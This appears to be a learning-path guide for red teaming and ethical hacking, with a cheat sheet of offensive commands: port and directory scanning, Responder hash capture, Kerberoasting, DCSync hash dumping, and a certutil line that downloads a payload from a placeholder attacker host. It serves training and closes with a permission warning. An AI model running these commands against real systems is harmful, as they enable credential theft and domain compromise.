This guide maps a battle-tested 100% free learning stack for breaking into red team / ethical hacking. The path is deliberate: foundations → web exploitation → real machines → Active Directory → post-exploitation → evasion. Self-discipline and a working VM are your only requirements. Execute in order.

LOLBAS + GTFOBins + LOLOL

The holy trinity of living-off-the-land references. LOLBAS (Windows) catalogs every trusted binary that can execute payloads, download files, or bypass controls — without dropping custom tools. Operator Notes // Key Commands
root@kali:~# nmap -sC -sV -p- --min-rate 5000 -oA full_scan 10.10.10.X # Full port scan, always save output
→ Enumerate first. Every service, every port. Never assume. Document before you attack.

root@kali:~# gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/big.txt -x php,html,txt
→ Brute-force every web service. Hidden paths = hidden attack surface. Include extensions.

root@kali:~# sudo responder -I eth0 -dwv # LLMNR/NBT-NS poisoning — AD initial access
→ Run during business hours on an AD segment. Capture NTLMv2 hashes passively.

root@kali:~# python3 GetUserSPNs.py DOMAIN/user:pass -dc-ip DC_IP -request # Kerberoasting
→ Request TGS for any SPN account. Crack the ticket offline with hashcat -m 13100.

root@kali:~# python3 secretsdump.py DOMAIN/admin:pass@DC_IP # DCSync — domain full compromise
→ Dump all NTLM hashes once you have DCSync rights. Store in loot/. Document the chain.

C:\> certutil -urlcache -split -f http://ATTACKER/payload.exe C:\Windows\Temp\p.exe
→ certutil is a LOLBIN. Trusted by Windows, often allowed by AV. Classic file transfer technique.

root@kali:~# find / -perm -4000 -type f 2>/dev/null # SUID binary hunt — Linux PrivEsc
→ Any SUID binary not expected? Check GTFOBins immediately. This is how 80% of CTF Linux boxes fall.

⚠ Rule: Stuck 2h → hint. Stuck 4h → walkthrough. But replay the box clean afterwards.
⚠ Document everything: screenshots, commands, output, timestamps. Build the habit for real engagements.
⚠ Never run tools against systems you don't own or have written permission to test.
